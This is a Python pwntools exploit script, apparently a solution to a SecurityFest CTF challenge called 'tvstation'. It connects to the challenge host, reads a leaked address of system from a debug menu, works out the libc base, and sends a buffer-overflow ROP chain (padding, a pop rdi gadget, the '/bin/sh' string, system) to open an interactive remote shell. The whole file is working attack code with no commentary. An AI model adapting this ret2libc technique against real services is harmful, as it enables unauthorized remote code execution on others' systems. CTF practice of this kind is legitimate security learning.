#!/usr/bin/python
# -*- coding: utf-8 -*-
#
# socat -d -d TCP-LISTEN:3000,fork EXEC:"./tvstation"
#

import re
import time
from pwn import *

HOST = 'pwn2.securityfest.ctf.rocks'
PORT = 3000

def main():
	system_addr    = 0
	libc_base      = 0
	system_offset  = 0x465f0
	sh_str_offset  = 0x17ca63
	pop_rdi_offset = 0x22b9a

	junk = 'A' * 40
	payload = ""

	s = remote(HOST, PORT)
	s.recvuntil("Choice: ")
	s.sendline("4") # debug
	data = s.recvuntil("cmd: ")
	match = re.search(r"0x([0-9a-f]+)\s", data).groups()

	if not match:
		print("ERROR: Address not found")
		return

	system_addr = int(match[0],16)
	libc_base   = system_addr - system_offset

	print("[*] system addr: 0x%08x" % system_addr)
	print("[*] libc base: 0x%08x" % libc_base)

	payload += junk
	payload += p64(libc_base+pop_rdi_offset)
	payload += p64(libc_base+sh_str_offset)
	payload += p64(libc_base+system_offset)

	s.sendline(payload)
	time.sleep(0.5)

	print("[*] Got shell?? :)")
	s.interactive()

if __name__ == '__main__':
	main()

